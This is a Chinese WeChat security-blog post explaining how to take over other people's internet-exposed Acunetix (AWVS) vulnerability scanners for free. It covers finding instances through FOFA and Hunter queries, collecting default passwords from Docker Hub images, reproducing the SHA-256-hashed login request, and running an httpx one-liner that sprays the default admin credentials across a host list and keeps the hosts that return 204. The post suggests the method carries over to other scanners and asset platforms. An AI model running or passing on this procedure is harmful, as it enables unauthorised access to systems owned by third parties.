#  通过默认口令白嫖AWVS

原创 Win64debug [ KQsec ](javascript:void\(0\);)

**KQsec** ![]()

微信号 M1debug

功能介绍 风起于青萍之末，止于草莽之间

____

___发表于_

收录于合集

网站空间资产测绘搜索：

fofa： "Acunetix"

鹰图：app.name=="AWVS"  
......

想办法将AWVS资产提取出来，形成txt列表。

收集默认口令：

    
    
    docker search awvs  
    

![]() **  
**

 **把docker hub 上的awvs默认密码全收集过来**

![]()![]()

###  分析AWVS登录逻辑

#### 登录时抓包

 **请求体数据包**

    
    
    POST /api/v1/me/login HTTP/1.1  
    Host: xxxxxxx:13443  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36  
    Content-Length: 159  
    Accept-Charset: utf-8  
    Content-Type: application/json  
    Accept-Encoding: gzip, deflate  
    Connection: close   
      
    {"email": "admin@admin.com", "password": "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2", "remember_me": "false", "logout_previous": "true"}  
    

POST 请求：https://$ip:port/api/v1/me/login

json格式

    
    
    {"email": "admin@admin.com", "password": "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2", "remember_me": "false", "logout_previous": "true"}  
    

需带上：`"logout_previous": "true"`

#### 分析password生成逻辑

通过简单前端JS调试，找到处理password的逻辑。

![]()

password 是 SHA256计算后得到的值：

    
    
    password: e.SHA256(O.password).toString()  
    

![]()使用在线SHA256加密或任意编程语言计算：

    
    
    package main  
      
    import (  
        "crypto/sha256"  
        "encoding/hex"  
        "fmt"  
    )  
      
    func hashPassword(password string) string {  
        hash := sha256.Sum256([]byte(password))  
        return hex.EncodeToString(hash[:])  
    }  
      
    func main() {  
        passwordHash := hashPassword("Admin123")  
        fmt.Println(passwordHash)  
    }  
    

经过多次分析，`AWVS`成功登录时响应码为`204`

假设将目标存在 `domains.txt`中，请求登录，`email`和`password`正确时，响应码为 `204`

![]()image.png

### 批量验证

使用`httpx`进行批量验证

    
    
    cat domains.txt|httpx -silent -H "Content-Type: application/json" -random-agent -proxy="http://127.0.0.1:7890" -body='{"email": "admin@admin.com", "password": "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2", "remember_me": "false", "logout_previous": "true"}' -x post -sc -nc -mc 204 -o awvs.txt  
    

  

 **其他破解、开源漏扫，资产收集工具（如：ARL），通用平台，可能也适用此思路**

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

